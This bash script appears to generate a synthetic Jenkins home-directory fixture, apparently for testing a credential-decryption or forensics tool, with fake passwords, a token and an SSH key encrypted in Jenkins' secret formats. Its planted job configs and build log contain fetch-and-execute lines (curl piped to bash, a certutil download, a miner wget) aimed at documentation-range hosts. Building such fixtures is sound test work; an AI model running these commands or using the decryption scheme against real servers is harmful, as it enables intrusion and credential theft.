#!/usr/bin/env bash
# Builds a JENKINS_HOME bundle with openssl/tar only (independent of lib/codec.py). Usage: jenkins_home_gen.sh OUT.tgz [wrongkey]
set -euo pipefail
OUT=$(realpath -m "$1"); W=$(mktemp -d); H=$W/jenkins_home; mkdir -p $H/secrets $H/jobs/deploy-app/builds/7 $H/jobs/release-pipe $H/jobs/seed-job
MK=$(for i in 1 2 3 4; do printf 'mk-seed-%s' $i | openssl dgst -sha512 -hex | awk '{print $NF}'; done | tr -d '\n')
printf '%s' "$MK" > $H/secrets/master.key
KEK=$(printf '%s' "$MK" | openssl dgst -sha256 -hex | awk '{print $NF}' | cut -c1-32)
for i in 1 2 3 4 5 6 7 8; do printf 'hs-seed-%s' $i | openssl dgst -sha256 -binary; done > $W/payload
printf '::::MAGIC::::' >> $W/payload
openssl enc -aes-128-ecb -K $KEK -in $W/payload -out $H/secrets/hudson.util.Secret
K=$(head -c 16 $W/payload | xxd -p)
newsec() {   # $1 plaintext, $2 iv seed -> {base64(0x01 | ivlen | datalen | iv | AES-CBC)}
  local IV; IV=$(printf '%s' "$2" | openssl dgst -md5 -hex | awk '{print $NF}')
  printf '%s' "$1" | openssl enc -aes-128-cbc -K $K -iv $IV > $W/ct
  { printf '\x01\x00\x00\x00\x10'; printf '%08x' $(stat -c %s $W/ct) | xxd -r -p; printf '%s' $IV | xxd -r -p; cat $W/ct; } | base64 -w0 | sed 's/^/{/;s/$/}/'
}
oldsec() { printf '%s::::MAGIC::::' "$1" | openssl enc -aes-128-ecb -K $K | base64 -w0; }
PKEY=$'-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW\nQyNTUxOQAAACBhuntress2026fixturekeymaterialonlyAAAA\n-----END OPENSSH PRIVATE KEY-----'
cat > $H/credentials.xml <<EOF
<?xml version='1.1' encoding='UTF-8'?>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1311.vcf0a_900b_37c2">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap\$Hash">
    <entry>
      <com.cloudbees.plugins.credentials.domains.Domain><specifications/></com.cloudbees.plugins.credentials.domains.Domain>
      <java.util.concurrent.CopyOnWriteArrayList>
        <com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>deploy-creds</id>
          <description>prod deploy</description>
          <username>svc_deploy</username>
          <password>$(newsec 'Wint3r!Deploy#2026' iv1)</password>
          <usernameSecret>false</usernameSecret>
        </com.cloudbees.plugins.credentials.impl.UsernamePasswordCredentialsImpl>
        <org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>
          <scope>GLOBAL</scope>
          <id>slack-token</id>
          <description></description>
          <secret>$(newsec 'xoxb-1111-2222-hctfFixtureToken' iv2)</secret>
        </org.jenkinsci.plugins.plaincredentials.impl.StringCredentialsImpl>
        <com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey plugin="ssh-credentials@305">
          <scope>GLOBAL</scope>
          <id>git-ssh</id>
          <username>git</username>
          <privateKeySource class="com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey\$DirectEntryPrivateKeySource">
            <privateKey>$(newsec "$PKEY" iv3)</privateKey>
          </privateKeySource>
        </com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey>
      </java.util.concurrent.CopyOnWriteArrayList>
    </entry>
  </domainCredentialsMap>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
EOF
cat > $H/jobs/deploy-app/config.xml <<'EOF'
<?xml version='1.1' encoding='UTF-8'?>
<project>
  <builders>
    <hudson.tasks.Shell>
      <command>curl -fsSL http://203.0.113.7/stage2.sh | bash &amp;&amp; echo done</command>
    </hudson.tasks.Shell>
    <hudson.tasks.BatchFile>
      <command>certutil -urlcache -f http://203.0.113.7/a.exe %TEMP%\a.exe</command>
    </hudson.tasks.BatchFile>
  </builders>
</project>
EOF
cat > $H/jobs/deploy-app/builds/7/build.xml <<'EOF'
<?xml version='1.1' encoding='UTF-8'?>
<build>
  <actions>
    <hudson.model.ParametersAction>
      <parameters>
        <hudson.model.StringParameterValue><name>TARGET_HOST</name><value>db01.corp.example</value></hudson.model.StringParameterValue>
      </parameters>
    </hudson.model.ParametersAction>
  </actions>
  <number>7</number>
</build>
EOF
printf 'Started by user admin\n+ curl -fsSL http://203.0.113.7/stage2.sh\n+ bash\nFinished: SUCCESS\n' > $H/jobs/deploy-app/builds/7/log
cat > $H/jobs/release-pipe/config.xml <<'EOF'
<?xml version='1.1' encoding='UTF-8'?>
<flow-definition plugin="workflow-job@1400">
  <definition class="org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition" plugin="workflow-cps@3900">
    <script>pipeline {
  agent any
  stages {
    stage(&apos;Build&apos;) {
      steps {
        sh &apos;wget -q http://203.0.113.9/miner -O /tmp/.m &amp;&amp; chmod +x /tmp/.m&apos;
      }
    }
  }
}</script>
    <sandbox>true</sandbox>
  </definition>
</flow-definition>
EOF
cat > $H/jobs/seed-job/config.xml <<EOF
<?xml version='1.1' encoding='UTF-8'?>
<project>
  <properties>
    <hudson.model.ParametersDefinitionProperty>
      <parameterDefinitions>
        <hudson.model.PasswordParameterDefinition>
          <name>DB_PASS</name>
          <defaultValue>$(oldsec 'Legacy-Hudson-Pass_77')</defaultValue>
        </hudson.model.PasswordParameterDefinition>
      </parameterDefinitions>
    </hudson.model.ParametersDefinitionProperty>
  </properties>
</project>
EOF
if [ "${2:-}" = wrongkey ]; then printf 'impostor-master-key-%064d' 0 > $H/secrets/master.key; fi
tar -C $W -czf "$OUT" --sort=name --mtime=2026-10-20 --owner=0 --group=0 jenkins_home
rm -rf "$W"
